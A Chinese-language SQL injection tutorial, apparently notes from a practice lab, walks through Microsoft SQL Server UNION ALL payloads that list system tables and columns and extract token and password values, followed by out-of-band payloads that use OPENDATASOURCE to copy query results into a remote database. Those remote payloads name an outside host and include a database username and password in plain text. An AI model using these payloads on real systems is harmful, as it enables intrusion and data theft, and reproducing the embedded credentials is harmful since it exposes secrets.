Mssql注入--反弹注入

注意点

  1. Mssql的注释符必须用–+,不能用#
  2. Mssql的联合查询必须写union all
  3. Mssql的select 1,2,3得写select null,null,null
  4. Mssql有自带的数据库和表

先正着做一遍

查找注入点

  • 1’ union all select null,null,null –+
    通过用数字和字符串替代null发现只要第二个null的地方有字符注入点,第一个有整型注入点
    (这就是因为mysql数据库会包容不兼容类型而mssql不会,所以得拿null去填充)

查找库名

  • 1' union all select null,name,null from dbo.sysobjects --+


注意,这里的name不是字段,不是表,而是描述表的信息,就像原理分析里面的唯一标识id一样,可以查找出自带库中的表的name和id.name就是已创建和自带表的名称,id就是用于唯一标识他们的身份.这样可以看到这样能查到许多许多的表,有一些自带表是无用的,我们过滤掉

查找用户创建的表名

  • 1' union all select id,name,null from dbo.sysobjects where xtype='U' --+
  • 用xtype=’U’指明需要找出用户创建的表,并找出其id.

查找指定表中字段

  • 1' union all select id,name,null from dbo.syscolumns where id=1977058079 --+

查值

  • 可以看到password和token字段比较可疑,去查一下
    1’ union all select null,token,null from admin –+


    得出结果

#总结

  • 自带表:dbo.sysobjects
  • 用户创建表: dbo.sysobjects where xtype=’U’
  • 字段:dbo.syscolumns

#反弹注入

  • 建立放在txt中做修改,,以此避免任何的任何格式的问题…

查表

  • id=1';insert into opendatasource ('sqloledb', 'server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666') . wxchen666.dbo.amdin select id,name from dbo.sysobjects where xtype='U' --+)
    在远程数据库里就会有数据插入(因为插入要求字段一样,所以单独创了一张表来配合使用,全部设置varchar即可)

查找指定表中字段

  • insert into opendatasource ('sqloledb', 'server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666') . wxchen666.dbo.id select name from dbo.syscolumns where id=1977058079 --+

查值

  • insert into opendatasource ('sqloledb', 'server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666') . wxchen666.dbo.id select token from admin --+

总结

  • 就是一个语法得问题,记住就行了,然后多注意一些和mysql不同的操作
  • 这就是一个sql语句,将select得到的数据作为结果集插入到远程的数据库中
